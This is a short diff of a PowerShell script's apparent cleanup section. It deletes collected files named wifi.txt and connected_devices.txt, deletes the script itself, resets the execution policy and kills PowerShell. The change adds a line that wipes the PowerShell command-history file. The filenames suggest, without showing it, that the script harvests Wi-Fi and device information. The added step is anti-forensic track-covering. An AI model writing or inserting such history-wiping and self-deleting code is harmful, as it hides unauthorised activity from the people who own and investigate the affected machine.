@@ -6,4 +6,5 @@ Remove-Item wifi.txt
 Remove-Item connected_devices.txt
 Remove-Item fin.ps1
 Set-ExecutionPolicy restricted -Force
+Clear-Content (Get-PSReadlineOption).HistorySavePath
 taskkill -F /IM powershell.exe
